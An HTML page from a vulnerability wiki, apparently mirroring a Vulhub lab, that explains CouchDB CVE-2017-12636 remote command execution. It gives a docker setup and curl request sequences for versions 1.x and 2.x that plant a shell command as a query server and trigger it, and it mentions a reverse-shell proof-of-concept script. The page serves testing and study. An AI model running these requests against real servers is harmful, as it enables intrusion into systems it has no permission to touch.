<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/CouchDB/CVE-2017-12636/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Couchdb Arbitrary Command Execution (CVE-2017-12636) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Couchdb Arbitrary Command Execution (CVE-2017-12636)", url: "#_top", children: [
              {title: "Vulnerable Environment", url: "#vulnerable-environment" },
              {title: "Exploit explanation", url: "#exploit-explanation" },
              {title: "POC script", url: "#poc-script" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Couchdb 任意命令执行漏洞（CVE-2017-12636）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2017-12635/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2017-12635/README.zh-cn/" class="btn btn-xs btn-link">
        Couchdb 垂直权限绕过漏洞（CVE-2017-12635）
      </a>
    </div>
    
  </div>

    

    <h1 id="couchdb-arbitrary-command-execution-cve-2017-12636">Couchdb Arbitrary Command Execution (CVE-2017-12636)<a class="headerlink" href="#couchdb-arbitrary-command-execution-cve-2017-12636" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Apache CouchDB is an open-source document-oriented NoSQL database, implemented in Erlang. CouchDB uses multiple formats and protocols to store, transfer, and process its data. It uses JSON to store data, JavaScript as its query language using MapReduce, and HTTP for an API.</p>
<p>CouchDB administrative users can configure the database server via HTTP(S). Some of the configuration options include paths for operating system-level binaries that are subsequently launched by CouchDB. This allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the CouchDB user, including downloading and executing scripts from the public internet.</p>
<p>Chain <a href="../CVE-2017-12635">CVE-2017-12635</a> and CVE-2017-12636 to get a unauthenticated remote command execution.</p>
<p>Reference link.</p>
<ul>
<li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li>
<li><a href="https://www.exploit-db.com/exploits/44498">https://www.exploit-db.com/exploits/44498</a></li>
<li><a href="http://bobao.360.cn/learning/detail/4716.html">http://bobao.360.cn/learning/detail/4716.html</a></li>
</ul>
<h2 id="vulnerable-environment">Vulnerable Environment<a class="headerlink" href="#vulnerable-environment" title="Permanent link">&para;</a></h2>
<p>API interfaces of Couchdb 2.x and and 1.x are somewhat different, so this vulnerability is exploited in a different way. This environment is about version 1.6.0, if you want to test version 2.1.0, you can use the <a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a>.</p>
<p>Start a Couchdb 1.6.0 server.</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the startup is complete, browse <code>http://your-ip:5984/</code> to see the welcome page of Couchdb.</p>
<h2 id="exploit-explanation">Exploit explanation<a class="headerlink" href="#exploit-explanation" title="Permanent link">&para;</a></h2>
<p>CVE-2017-12636 is a post-authentication RCE, so if you do not know the target administrator password, you can use <a href="https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635">CVE-2017-12635</a> to add an administrator user first.</p>
<h3 id="exploit-under-1x">Exploit under 1.x<a class="headerlink" href="#exploit-under-1x" title="Permanent link">&para;</a></h3>
<p>Execute the following requests in sequence to trigger arbitrary command execution.</p>
<div class="highlight"><pre><span></span><code>curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd&#39; -d &#39;&quot;id &gt;/tmp/success&quot;&#39;
curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest&#39;
curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest/vul&#39; -d &#39;{&quot;_id&quot;: &quot;770895a97726d5ca6d70a22173005c7b&quot;}&#39;
curl -X POST &#39;http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10&#39; -d &#39;{&quot;language&quot;: &quot;cmd&quot;, &quot;map&quot;:&quot;&quot;}&#39; -H &#39;Content-Type: application/json&#39;
</code></pre></div>
<p>Here, <code>vulhub:vulhub</code> is the administrator account and password.</p>
<p>The first request is to add a <strong>query_servers</strong> with the name <code>cmd</code> and the value <code>"id &gt;/tmp/success"</code>, which is the command we are going to execute later.</p>
<p>The second and third requests are to add a database and document, which can be queried only after it is added here.</p>
<p>The fourth request is to do a query in this Database, a <strong>query_servers</strong> named <code>cmd</code> that I added in the first step is used, and finally trigger the command execution.</p>
<h3 id="exploit-under-2x">Exploit under 2.x<a class="headerlink" href="#exploit-under-2x" title="Permanent link">&para;</a></h3>
<p>The two APIs I used above have been modified in 2.1.0 and need to be explained in detail here.</p>
<p>Couchdb 2.x introduces clustering, browser the <code>/_membership</code> to get the node list.</p>
<div class="highlight"><pre><span></span><code>curl http://vulhub:vulhub@your-ip:5984/_membership
</code></pre></div>
<p><img alt="" src="1.png" /></p>
<p>As you can see, we have only one node here, with the name <code>nonode@nohost</code>.</p>
<p>Then, modify the configuration of node <code>nonode@nohost</code> as follows.</p>
<div class="highlight"><pre><span></span><code>curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#39;&quot;id &gt;/tmp/success&quot;&#39;
</code></pre></div>
<p><img alt="" src="2.png" /></p>
<p>Then, in the same way as the 1.6.0 exploit:</p>
<div class="highlight"><pre><span></span><code>curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest&#39;
curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest/vul&#39; -d &#39;{&quot;_id&quot;: &quot;770895a97726d5ca6d70a22173005c7b&quot;}&#39;
</code></pre></div>
<p>Couchdb 2.x removed <code>_temp_view</code>, so we need to add a <code>_view</code> in order to trigger the command defined in <code>query_servers</code>:</p>
<div class="highlight"><pre><span></span><code>curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d &#39;{&quot;_id&quot;:&quot;_design/test&quot;, &quot;views&quot;:{&quot;woyun&quot;:{&quot;map&quot;:&quot;&quot;} },&quot; language&quot;: &quot;cmd&quot;}&#39; -H &quot;Content-Type: application/json&quot;
</code></pre></div>
<p>Then commands in <code>query_servers</code> will be executed.</p>
<h2 id="poc-script">POC script<a class="headerlink" href="#poc-script" title="Permanent link">&para;</a></h2>
<p>I wrote a simple POC <a href="exp.py">exp.py</a>, modified the target and command inside the script to your test target, then modified the version to the corresponding Couchdb version (1 or 2), and successfully get the reverse shell:</p>
<p><img alt="" src="3.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Couchdb 任意命令执行漏洞（CVE-2017-12636）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2017-12635/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2017-12635/README.zh-cn/" class="btn btn-xs btn-link">
        Couchdb 垂直权限绕过漏洞（CVE-2017-12635）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>